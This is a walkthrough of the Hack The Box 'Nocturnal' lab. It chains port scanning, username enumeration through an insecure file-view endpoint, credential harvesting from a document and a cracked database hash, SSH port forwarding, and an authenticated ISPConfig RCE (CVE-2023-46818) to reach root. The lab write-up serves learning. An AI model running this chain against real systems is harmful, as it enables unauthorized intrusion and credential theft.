HTB – Nocturnal (10.10.11.64) — Classic PHP Stack ➜ File Upload ➜ Credential Harvest ➜ SSH ➜ ISPConfig RCE ➜ Root via CVE-2023-46818
🚀 Initial Recon

nmap -sC -sV -Pn -p- 10.10.11.64

🔓 Open Ports

22/tcp   OpenSSH 8.2p1 Ubuntu
80/tcp   nginx 1.18.0 (Ubuntu)

🧠 No signs of containerization (TTL: 63) — likely bare-metal or VM.

🎯 Virtual Host identified: nocturnal.htb

echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts

🌐 Web Enumeration (Port 80)

    Title redirects to: http://nocturnal.htb/

    Tech stack: PHP, nginx 1.18.0, Ubuntu

    Contact info found in source: support@nocturnal.htb

    Explored endpoints:

    /login.php
    /register.php
    /backups/
    /uploads/
    /admin.php (403 unless admin)
    /view.php?username=admin2&file=upload1.pdf

🧪 Registration & Upload Bypass

Registered with:

Username: admin2
Password: admin2

➡️ Upload functionality available after login
🚫 Extension whitelist: pdf, doc, docx, xls, xlsx, odt
🧠 Only extension is validated ➜ potential bypass opportunity
🕵️ User Enumeration & Loot

Used /view.php to brute usernames:

/view.php?username=amanda&file=.pdf

🧩 Found valid file:

<a href="view.php?username=amanda&file=privacy.odt">privacy.odt</a>

Extracted password from .odt:

amanda : a[REDACTED]J

🔑 Admin Panel Access ➜ DB Dump

Logged in as amanda ➜ gained access to /admin.php
Dumped full site backup, including SQLite DB

🧬 Extracted user hash:

tobias : 55c8[REDACTED]061d

Cracked via CrackStation:

Password: slowmotionapocalypse

🔐 SSH Access (tobias)

ssh tobias@nocturnal.htb

✅ Login successful ➜ user shell

Observed a weird SUID binary (sendmail), but non-exploitable.

Found localhost web service on port 8080
Port-forwarded via SSH:

ssh tobias@nocturnal.htb -L 8081:127.0.0.1:8080

🕸️ Internal Web App – ISPConfig

At http://127.0.0.1:8081/ ➜ ISPConfig panel exposed.

Tried default login:

Username: admin
Password: slowmotionapocalypse

✅ Login success

Discovered CVE-2023-46818 – authenticated RCE in ISPConfig
📖 Exploit Code
🧨 Exploitation ➜ Root

Ran exploit:

python3 exploit.py http://127.0.0.1:8081/ admin sl[REDACTED]se

🏁 Got root shell.
